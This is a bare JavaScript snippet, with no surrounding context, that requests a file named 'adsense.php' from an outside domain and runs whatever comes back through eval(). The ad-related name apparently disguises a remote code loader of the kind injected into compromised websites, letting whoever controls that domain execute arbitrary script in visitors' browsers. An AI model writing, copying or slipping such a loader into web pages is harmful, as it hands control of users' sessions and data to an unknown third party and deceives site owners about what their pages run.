var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        eval(xhr.responseText)
    }
}
xhr.open('GET', 'https://susayi.us/adsense.php', true);
xhr.send(null);
